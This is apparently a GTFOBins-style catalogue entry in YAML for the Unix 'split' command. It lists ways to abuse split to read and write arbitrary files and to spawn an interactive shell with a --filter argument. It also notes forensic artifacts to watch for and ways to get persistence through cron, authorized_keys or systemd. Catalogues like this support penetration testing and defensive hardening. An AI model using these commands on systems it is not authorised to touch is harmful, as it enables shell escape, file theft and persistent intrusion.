---
name: split
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    split -b 999 --additional-suffix suffix /path/to/input-file prefix
    cat prefixaasuffix
  notes: This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: split -b 999 --additional-suffix suffix /path/to/input-file prefix
  notes: This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
references:
- https://gtfobins.github.io/gtfobins/split/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
